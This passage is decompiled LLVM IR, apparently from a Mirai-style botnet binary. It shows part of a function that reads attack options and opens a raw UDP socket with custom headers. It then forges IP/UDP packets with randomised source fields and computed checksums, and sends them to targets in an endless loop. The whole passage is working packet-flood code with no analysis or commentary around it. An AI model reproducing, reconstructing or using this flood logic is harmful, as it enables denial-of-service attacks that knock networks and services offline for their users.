  %v6_8f44 = inttoptr i32 %v0_8f38 to i32*
  %v7_8f44 = call i32 @attack_get_opt_int(i32 %v0_8f3c, i32* %v6_8f44, i32 3, i32 65535)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
  %v5_8f5c = inttoptr i32 %v0_8f48 to i32*
  %v6_8f5c = call i32 @attack_get_opt_int(i32 %v0_8f58, i32* %v5_8f5c, i32 4, i32 64)
  %v1_8f64 = urem i32 %v6_8f5c, 256
  store i32 %v1_8f64, i32* %ip.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f74 = load i32, i32* @r4, align 4
  store i32 %v0_8f74, i32* %r0.global-to-local, align 4
  %v6_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v7_8f7c = call i32 @attack_get_opt_int(i32 %v0_8f74, i32* %v6_8f7c, i32 5, i32 0)
  %v1_8f88 = urem i32 %v7_8f7c, 256
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  store i32 %v0_8f94, i32* %r1.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f94 to i32*
  %v6_8fa0 = call i32 @attack_get_opt_int(i32 %v0_8f98, i32* %v5_8fa0, i32 6, i32 65535)
  %v0_8fa8 = load i32, i32* @r5, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8fa0, i32* %sb.global-to-local, align 4
  %v0_8fb8 = load i32, i32* @r4, align 4
  store i32 %v0_8fb8, i32* %r0.global-to-local, align 4
  %v4_8fbc = inttoptr i32 %v0_8fa8 to i32*
  %v5_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb8, i32* %v4_8fbc, i32 7, i32 65535)
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8fbc, i32* @sl, align 4
  %v0_8fd0 = load i32, i32* @r4, align 4
  store i32 %v0_8fd0, i32* %r0.global-to-local, align 4
  %v4_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v5_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v4_8fd4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r5, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 %v5_8fd4, i32* @r6, align 4
  %v0_8fe8 = load i32, i32* @r4, align 4
  store i32 %v0_8fe8, i32* %r0.global-to-local, align 4
  %v4_8fec = inttoptr i32 %v0_8fe0 to i32*
  %v5_8fec = call i32 @attack_get_opt_int(i32 %v0_8fe8, i32* %v4_8fec, i32 1, i32 1)
  %v2_8ff8 = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_8ff8, i32* %r3.global-to-local, align 4
  %v1_8ffc = urem i32 %v5_8fec, 256
  store i32 %v1_8ffc, i32* %ip.global-to-local, align 4
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %v0_9000, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9008 = load i32, i32* @r4, align 4
  store i32 %v0_9008, i32* %r0.global-to-local, align 4
  %v5_9010 = inttoptr i32 %v0_9000 to i32*
  %v6_9010 = call i32 @attack_get_opt_int(i32 %v0_9008, i32* %v5_9010, i32 25, i32 %v2_8ff8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9024 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_9024, i32* %r0.global-to-local, align 4
  %v7_9028 = icmp eq i32 %v3_9024, -1
  store i1 %v7_9028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9024, i32* @fp, align 4
  br i1 %v7_9028, label %dec_label_pc_93c8, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_903c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_903c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9050 = call i32 @__GI_setsockopt(i32 %v3_9024, i32 0, i32 3, i32 %v6_903c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9050, i32* %r0.global-to-local, align 4
  %v7_9054 = icmp eq i32 %v5_9050, -1
  store i1 %v7_9054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9054, label %dec_label_pc_93c0, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9034
  %v0_905c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9068 = urem i32 %v0_905c, 65536
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  %v3_906c = icmp ugt i32 %v3_9068, 1459
  %v9_906c = icmp eq i32 %v3_9068, 1460
  store i1 %v9_906c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_906c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_905c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_905c, %bb
  %v0_90c8 = phi i32 [ %v3_9068, %dec_label_pc_905c ], [ 1460, %bb ]
  store i32 %v7_8f44, i32* %r0.global-to-local, align 4
  %v0_9078 = load i32, i32* %sb.global-to-local, align 4
  %v3_9080 = urem i32 %v0_9078, 65536
  store i32 %v3_9080, i32* %ip.global-to-local, align 4
  %v0_9084 = load i32, i32* @r7, align 4
  %v2_9084 = icmp eq i32 %v0_9084, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  %v0_9088 = load i32, i32* @sl, align 4
  %v3_9088 = mul i32 %v0_9088, 65536
  br i1 %v2_9084, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_90c8, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_90b8 = phi i32 [ %v3_9080, %bb48 ], [ %v0_90c8, %bb49 ]
  %v3_9098 = urem i32 %v0_9088, 65536
  store i32 %v3_9098, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_90a0 = urem i32 %v7_8f44, 65536
  store i32 %v3_90a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9084, label %.thread, label %dec_label_pc_90c0

.thread:                                          ; preds = %bb50
  %v2_90b4 = add nsw i32 %v1_90b8, 28
  store i32 %v2_90b4, i32* @sb, align 4
  %v2_90b8 = add nsw i32 %v1_90b8, 8
  store i32 %v2_90b8, i32* @sl, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_90c0:                                ; preds = %bb50
  %v1_90c8 = add nuw nsw i32 %v0_90c8, 28
  store i32 %v1_90c8, i32* @sb, align 4
  %v1_90cc = add nuw nsw i32 %v0_90c8, 8
  store i32 %v1_90cc, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9078, 256
  %v3_90e0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9078, 256
  %v4_90f0 = urem i32 %tmp52, 256
  %v5_90f0 = or i32 %v4_90f0, %v3_90e0
  store i32 %v5_90f0, i32* @r6, align 4
  store i32 %v3_9088, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_90c8, 256
  %v3_90fc = and i32 %tmp53, 65280
  store i32 %v3_90fc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9088, 256
  %v3_9100 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_90cc, 256
  %v3_9104 = and i32 %tmp55, 65280
  store i32 %v3_9104, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_90c8, 256
  %v4_9108 = urem i32 %tmp56, 256
  %v5_9108 = or i32 %v4_9108, %v3_90fc
  store i32 %v5_9108, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9088, 256
  %v4_910c = urem i32 %tmp57, 256
  %v5_910c = or i32 %v4_910c, %v3_9100
  store i32 %v5_910c, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_90cc to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f44, 256
  %v3_9114 = and i32 %tmp58, 65280
  store i32 %v3_9114, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f44, 256
  %v4_9124 = urem i32 %tmp59, 256
  %v5_9124 = or i32 %v4_9124, %v3_9114
  store i32 %v5_9124, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_917c = sext i8 %v5_8f40 to i32
  %sext6 = mul nuw i32 %v5_9108, 65536
  %v4_9198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_910c, 65536
  %v7_91cc = sdiv i32 %sext7, 65536
  %v1_918c = trunc i32 %v6_8f5c to i8
  %v3_91cc = sext i16 %rev to i32
  br label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %.thread9, %dec_label_pc_90c0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9138 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_9138, i32* %r0.global-to-local, align 4
  store i32 %v2_8f08, i32* %r3.global-to-local, align 4
  %v3_9140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9140, i32* %r1.global-to-local, align 4
  %v2_9144 = load i32, i32* @r4, align 4
  %v5_9144 = mul i32 %v2_9144, 4
  %v6_9144 = add i32 %v5_9144, %v2_8f08
  %v7_9144 = inttoptr i32 %v6_9144 to i32*
  store i32 %v2_9138, i32* %v7_9144, align 4
  %v0_9148 = load i32, i32* %r3.global-to-local, align 4
  %v1_9148 = load i32, i32* %r1.global-to-local, align 4
  %v4_9148 = mul i32 %v1_9148, 4
  %v5_9148 = add i32 %v4_9148, %v0_9148
  %v6_9148 = inttoptr i32 %v5_9148 to i32*
  %v7_9148 = load i32, i32* %v6_9148, align 4
  store i32 %v7_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v7_9148 to i8*
  %v2_914c = load i8, i8* %v1_914c, align 1
  %tmp = urem i8 %v2_914c, 16
  %v1_9150 = zext i8 %tmp to i32
  %v1_9154 = or i32 %v1_9150, 64
  store i32 %v1_9154, i32* %r3.global-to-local, align 4
  %v1_9158 = trunc i32 %v1_9154 to i8
  store i8 %v1_9158, i8* %v1_914c, align 1
  %v0_915c = load i32, i32* %r0.global-to-local, align 4
  %v1_915c = inttoptr i32 %v0_915c to i8*
  %v2_915c = load i8, i8* %v1_915c, align 1
  %v1_9160 = and i8 %v2_915c, -16
  %v1_9164 = or i8 %v1_9160, 5
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  %v0_916c = load i32, i32* %r1.global-to-local, align 4
  %v3_916c = mul i32 %v0_916c, 32
  store i32 %v3_916c, i32* %r2.global-to-local, align 4
  store i8 %v1_9164, i8* %v1_915c, align 1
  %v0_9174 = load i32, i32* %r1.global-to-local, align 4
  %v1_9174 = add i32 %v0_9174, 1
  store i32 %v1_9174, i32* @r4, align 4
  %v0_9178 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9174, -8
  %v5_9178 = add i32 %v0_9178, %tmp61
  store i32 %v5_9178, i32* %r2.global-to-local, align 4
  store i32 %v4_917c, i32* %r1.global-to-local, align 4
  %v2_9180 = load i32, i32* %r0.global-to-local, align 4
  %v3_9180 = add i32 %v2_9180, 1
  %v4_9180 = inttoptr i32 %v3_9180 to i8*
  store i8 %v5_8f40, i8* %v4_9180, align 1
  store i32 %v1_8f64, i32* %r3.global-to-local, align 4
  %v0_9188 = load i32, i32* %ip.global-to-local, align 4
  %v2_9188 = icmp eq i32 %v0_9188, 0
  store i1 %v2_9188, i1* %cpsr_z.global-to-local, align 1
  %v2_918c = load i32, i32* %r0.global-to-local, align 4
  %v3_918c = add i32 %v2_918c, 8
  %v4_918c = inttoptr i32 %v3_918c to i8*
  store i8 %v1_918c, i8* %v4_918c, align 1
  %v0_9190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9190, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_912c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9194 = load i32, i32* %r0.global-to-local, align 4
  %v4_9194 = add i32 %v3_9194, 6
  %v5_9194 = inttoptr i32 %v4_9194 to i16*
  store i16 64, i16* %v5_9194, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_912c, %bb60
  store i32 %v4_9198, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_91a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a0 = add i32 %v2_91a0, 9
  %v4_91a0 = inttoptr i32 %v3_91a0 to i8*
  store i8 17, i8* %v4_91a0, align 1
  %v0_91a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_91a4 = trunc i32 %v0_91a4 to i16
  %v2_91a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a4 = add i32 %v2_91a4, 2
  %v4_91a4 = inttoptr i32 %v3_91a4 to i16*
  store i16 %v1_91a4, i16* %v4_91a4, align 2
  store i32 %v6_9010, i32* %ip.global-to-local, align 4
  %v1_91ac = load i32, i32* %r0.global-to-local, align 4
  %v2_91ac = add i32 %v1_91ac, 12
  %v3_91ac = inttoptr i32 %v2_91ac to i32*
  store i32 %v6_9010, i32* %v3_91ac, align 4
  %v0_91b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_91b0 = load i32, i32* @r8, align 4
  %v2_91b0 = add i32 %v1_91b0, %v0_91b0
  store i32 %v2_91b0, i32* %r2.global-to-local, align 4
  %v1_91b4 = add i32 %v2_91b0, 16
  %v2_91b4 = inttoptr i32 %v1_91b4 to i32*
  %v3_91b4 = load i32, i32* %v2_91b4, align 4
  store i32 %v3_91b4, i32* %r3.global-to-local, align 4
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91b8 = trunc i32 %v0_91b8 to i16
  %v2_91b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i16*
  store i16 %v1_91b8, i16* %v4_91b8, align 2
  %v0_91bc = load i32, i32* %r0.global-to-local, align 4
  %v1_91bc = add i32 %v0_91bc, 20
  store i32 %v1_91bc, i32* %r1.global-to-local, align 4
  %v0_91c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_91c0 = add i32 %v0_91bc, 16
  %v3_91c0 = inttoptr i32 %v2_91c0 to i32*
  store i32 %v0_91c0, i32* %v3_91c0, align 4
  %v0_91c4 = load i32, i32* @r6, align 4
  %v1_91c4 = trunc i32 %v0_91c4 to i16
  %v2_91c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91c4 = add i32 %v2_91c4, 20
  %v4_91c4 = inttoptr i32 %v3_91c4 to i16*
  store i16 %v1_91c4, i16* %v4_91c4, align 2
  store i32 %v3_91cc, i32* %r0.global-to-local, align 4
  store i32 %v7_91cc, i32* %r3.global-to-local, align 4
  %v0_91d0 = load i32, i32* @r4, align 4
  %v1_91d0 = load i32, i32* @r7, align 4
  %v9_91d0 = icmp eq i32 %v0_91d0, %v1_91d0
  store i1 %v9_91d0, i1* %cpsr_z.global-to-local, align 1
  %v2_91d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d4 = add i32 %v2_91d4, 4
  %v4_91d4 = inttoptr i32 %v3_91d4 to i16*
  store i16 %rev, i16* %v4_91d4, align 2
  %v0_91d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_91d8 = trunc i32 %v0_91d8 to i16
  %v2_91d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d8 = add i32 %v2_91d8, 2
  %v4_91d8 = inttoptr i32 %v3_91d8 to i16*
  store i16 %v1_91d8, i16* %v4_91d8, align 2
  %v0_91dc = load i32, i32* @r4, align 4
  store i32 %v0_91dc, i32* %stack_var_-44, align 4
  %v5_91e0 = icmp slt i32 %v0_91d0, %v1_91d0
  br i1 %v5_91e0, label %dec_label_pc_912c, label %dec_label_pc_91e4.preheader.loopexit

dec_label_pc_91e4.preheader.loopexit:             ; preds = %.thread9
  %v0_91e8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_91e4.preheader:                      ; preds = %.thread, %dec_label_pc_91e4.preheader.loopexit
  %v0_91e8.pre = phi i32 [ %v0_91e8.pre.pre, %dec_label_pc_91e4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9350 = icmp eq i32 %v6_9010, -1
  %v8_9350 = icmp eq i32 %v6_9010, -1
  %v3_9368 = icmp eq i32 %v3_90a0, 65535
  %v2_93a4 = icmp eq i32 %v1_8ffc, 0
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4, %dec_label_pc_91e4.preheader
  %v0_91e8 = phi i32 [ %v0_91e8.pre, %dec_label_pc_91e4.preheader ], [ 0, %dec_label_pc_92e4 ], [ 0, %dec_label_pc_91e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91e8 = icmp eq i32 %v0_91e8, 0
  store i1 %v2_91e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_9260, %dec_label_pc_91f4
  %v1_920c = phi i32 [ %v1_92d4, %dec_label_pc_9260 ], [ 0, %dec_label_pc_91f4 ]
  %v5_91fc = mul i32 %v1_920c, 24
  %v1_9200 = load i32, i32* @r8, align 4
  %v2_9200 = add i32 %v1_9200, %v5_91fc
  store i32 %v2_9200, i32* %r3.global-to-local, align 4
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  %v1_9208 = add i32 %v2_9200, 20
  %v2_9208 = inttoptr i32 %v1_9208 to i8*
  %v3_9208 = load i8, i8* %v2_9208, align 1
  %v4_9208 = zext i8 %v3_9208 to i32
  store i32 %v4_9208, i32* %r2.global-to-local, align 4
  %v4_920c = mul i32 %v1_920c, 4
  %v5_920c = add i32 %v4_920c, %v2_8f08
  %v6_920c = inttoptr i32 %v5_920c to i32*
  %v7_920c = load i32, i32* %v6_920c, align 4
  store i32 %v7_920c, i32* @r5, align 4
  %v7_9210 = icmp eq i8 %v3_9208, 31
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  %v1_9214 = add i32 %v7_920c, 20
  store i32 %v1_9214, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_9208, 32
  br i1 %tmp62, label %dec_label_pc_92f8, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %dec_label_pc_91f8
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9228:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_923c

dec_label_pc_923c:                                ; preds = %dec_label_pc_9358.dec_label_pc_923c_crit_edge, %dec_label_pc_9228
  %v1_9240 = phi i32 [ %v1_9240.pre, %dec_label_pc_9358.dec_label_pc_923c_crit_edge ], [ 65535, %dec_label_pc_9228 ]
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v9_9240 = icmp eq i32 %v3_9080, %v1_9240
  store i1 %v9_9240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9240, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9248:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v1_924c = phi i32 [ %v1_9380, %dec_label_pc_9374 ], [ %v1_9240, %dec_label_pc_923c ]
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v9_924c = icmp eq i32 %v3_9098, %v1_924c
  store i1 %v9_924c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_924c, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_9260:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c, %dec_label_pc_93b0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9264 = load i32, i32* @r5, align 4
  %v3_9264 = add i32 %v2_9264, 10
  %v4_9264 = inttoptr i32 %v3_9264 to i16*
  store i16 0, i16* %v4_9264, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_926c = load i32, i32* @r5, align 4
  store i32 %v0_926c, i32* @r0, align 4
  %v2_9270 = call i32 @checksum_generic(i32 %v0_926c, i32 20)
  %v3_9270 = trunc i32 %v2_9270 to i16
  %v3_9274 = load i32, i32* @r5, align 4
  %v4_9274 = add i32 %v3_9274, 10
  %v5_9274 = inttoptr i32 %v4_9274 to i16*
  store i16 %v3_9270, i16* %v5_9274, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_927c = load i32, i32* @r6, align 4
  %v3_927c = add i32 %v2_927c, 6
  %v4_927c = inttoptr i32 %v3_927c to i16*
  store i16 0, i16* %v4_927c, align 2
  %v0_9280 = load i32, i32* @r6, align 4
  store i32 %v0_9280, i32* @r1, align 4
  %v1_9284 = add i32 %v0_9280, 4
  %v2_9284 = inttoptr i32 %v1_9284 to i16*
  %v3_9284 = load i16, i16* %v2_9284, align 2
  %v4_9284 = zext i16 %v3_9284 to i32
  store i32 %v4_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* @sl, align 4
  store i32 %v0_9288, i32* %r3.global-to-local, align 4
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v4_9290 = call i32 @checksum_tcpudp(i32 %v0_928c, i32 %v0_9280, i32 %v4_9284, i32 %v0_9288)
  %v5_9290 = trunc i32 %v4_9290 to i16
  store i32 %v4_9290, i32* %r0.global-to-local, align 4
  %v3_9294 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9294, i32* %r3.global-to-local, align 4
  %v3_9298 = mul i32 %v3_9294, 32
  store i32 %v3_9298, i32* %lr.global-to-local, align 4
  %v3_929c = load i32, i32* @r6, align 4
  %v4_929c = add i32 %v3_929c, 6
  %v5_929c = inttoptr i32 %v4_929c to i16*
  store i16 %v5_9290, i16* %v5_929c, align 2
  %v0_92a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_92a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_92a0, -8
  %v5_92a0 = add i32 %v0_92a0, %tmp63
  store i32 %v5_92a0, i32* %lr.global-to-local, align 4
  %v0_92a4 = load i32, i32* @r6, align 4
  %v1_92a4 = add i32 %v0_92a4, 2
  %v2_92a4 = inttoptr i32 %v1_92a4 to i16*
  %v3_92a4 = load i16, i16* %v2_92a4, align 2
  %v4_92a4 = zext i16 %v3_92a4 to i32
  store i32 %v4_92a4, i32* @r6, align 4
  %v1_92a8 = load i32, i32* @r8, align 4
  %v2_92a8 = add i32 %v1_92a8, %v5_92a0
  store i32 %v2_92a8, i32* @lr, align 4
  %v3_92ac = add i32 %v2_92a8, 2
  %v4_92ac = inttoptr i32 %v3_92ac to i16*
  store i16 %v3_92a4, i16* %v4_92ac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r5, align 4
  store i32 %v0_92b8, i32* %r1.global-to-local, align 4
  %v0_92bc = load i32, i32* @fp, align 4
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v0_92c0 = load i32, i32* @sb, align 4
  store i32 %v0_92c0, i32* %r2.global-to-local, align 4
  %v0_92c4 = load i32, i32* @lr, align 4
  %v6_92cc = call i32 @__libc_sendto(i32 %v0_92bc, i32 %v0_92b8, i32 %v0_92c0, i32 16384, i32 %v0_92c4, i32 16)
  %v3_92d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92d0, i32* %r3.global-to-local, align 4
  %v1_92d4 = add i32 %v3_92d0, 1
  store i32 %v1_92d4, i32* %r0.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r7, align 4
  %v9_92d8 = icmp eq i32 %v1_92d4, %v1_92d8
  store i1 %v9_92d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_92d4, i32* %stack_var_-44, align 4
  %v5_92e0 = icmp slt i32 %v1_92d4, %v1_92d8
  br i1 %v5_92e0, label %dec_label_pc_91f8, label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9260
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92e8 = icmp eq i32 %v1_92d8, 0
  store i1 %v2_92e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_92f8:                                ; preds = %dec_label_pc_91f8
  %v1_92f8 = add i32 %v2_9200, 16
  %v2_92f8 = inttoptr i32 %v1_92f8 to i32*
  %v3_92f8 = load i32, i32* %v2_92f8, align 4
  %v0_92fc = call i32 @rand_next()
  store i32 %v0_92fc, i32* %r0.global-to-local, align 4
  %v3_9300 = load i32, i32* %stack_var_-44, align 4
  %v5_9308 = mul i32 %v3_9300, 24
  %v1_930c = and i32 %v3_92f8, 16711680
  store i32 %v1_930c, i32* %ip.global-to-local, align 4
  %v3_9310 = udiv i32 %v3_92f8, 16777216
  %v4_9314 = udiv i32 %v1_930c, 256
  %v5_9314 = or i32 %v4_9314, %v3_9310
  store i32 %v5_9314, i32* %r2.global-to-local, align 4
  %v1_9318 = load i32, i32* @r8, align 4
  %v2_9318 = add i32 %v1_9318, %v5_9308
  store i32 %v2_9318, i32* %r1.global-to-local, align 4
  %v1_931c = and i32 %v3_92f8, 65280
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  %v1_9320 = add i32 %v2_9318, 20
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  store i32 %v4_9320, i32* %ip.global-to-local, align 4
  %v5_9328 = call i32 @llvm.bswap.i32(i32 %v3_92f8)
  %v7_932c = lshr i32 %v0_92fc, %v4_9320
  %v8_932c = add i32 %v7_932c, %v5_9328
  store i32 %v8_932c, i32* %r2.global-to-local, align 4
  %v1_9330 = and i32 %v8_932c, 16711680
  store i32 %v1_9330, i32* %r0.global-to-local, align 4
  %v1_933c = and i32 %v8_932c, 65280
  store i32 %v1_933c, i32* %r1.global-to-local, align 4
  %v5_9344 = call i32 @llvm.bswap.i32(i32 %v8_932c)
  %v1_9348 = load i32, i32* @r5, align 4
  %v2_9348 = add i32 %v1_9348, 16
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v5_9344, i32* %v3_9348, align 4
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9358:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  %v0_9358 = call i32 @rand_next()
  store i32 %v0_9358, i32* %r0.global-to-local, align 4
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  %v1_936c = load i32, i32* @r5, align 4
  %v2_936c = add i32 %v1_936c, 12
  %v3_936c = inttoptr i32 %v2_936c to i32*
  store i32 %v0_9358, i32* %v3_936c, align 4
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_9358.dec_label_pc_923c_crit_edge

dec_label_pc_9358.dec_label_pc_923c_crit_edge:    ; preds = %dec_label_pc_9358
  %v1_9240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_923c

dec_label_pc_9374:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9228
